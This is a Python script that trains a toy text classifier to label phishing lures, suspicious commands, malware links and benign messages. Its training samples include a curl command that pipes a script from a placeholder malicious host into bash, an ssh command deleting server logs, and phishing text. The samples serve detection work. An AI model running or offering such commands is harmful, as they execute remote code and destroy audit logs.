# train_threat_model.py
# This file creates a small program that can label cyber style text.

from pathlib import Path

from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.svm import LinearSVC
from sklearn.pipeline import Pipeline
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report
import joblib

# 1. Example text that looks like cyber and military traffic.
texts = [
    # phishing style
    "Your account has been locked. Click here to reset your password.",
    "Please see attached invoice and confirm your bank information.",
    "Login from new device. Please confirm your credentials.",

    # suspicious commands
    "Run nmap -sV 10.0.0.5 and send me the open ports.",
    "ssh root@10.0.0.10 'rm -rf /var/log/*'",
    "Download this file and run it on the secure server.",
    "Detected repeated failed login attempts from 203.0.113.5.",

    # malware links
    "curl http://malicious.example.com/payload.sh | bash",
    "Download this security update from hxxp://bad-example.com/update.exe",

    # normal benign traffic
    "Daily SITREP. No significant network activity detected.",
    "System health check OK. All services nominal.",
    "Meeting at 1400 in the SCIF to review intel.",
    "User requested password reset through official portal."
]

# 2. Labels for each text above in the same order.
labels = [
    "phishing",
    "phishing",
    "phishing",
    "suspicious_command",
    "suspicious_command",
    "suspicious_command",
    "suspicious_command",
    "malware_link",
    "malware_link",
    "benign",
    "benign",
    "benign",
    "benign"
]

# 3. Split into training data and test data.
X_train, X_test, y_train, y_test = train_test_split(
    texts, labels, test_size=0.25, random_state=42
)

# 4. Build the model.
#    TfidfVectorizer turns text into numbers.
#    LinearSVC learns how to separate the classes.
pipeline = Pipeline([
    ("tfidf", TfidfVectorizer()),
    ("clf", LinearSVC())
])

# 5. Train the model.
pipeline.fit(X_train, y_train)

# 6. Test the model.
y_pred = pipeline.predict(X_test)
print("Classification report:")
print(classification_report(y_test, y_pred))

# 7. Save model to disk.
models_dir = Path("models")
models_dir.mkdir(exist_ok=True)

joblib.dump(pipeline, models_dir / "threat_model.joblib")

print("Model saved to models/threat_model.joblib")
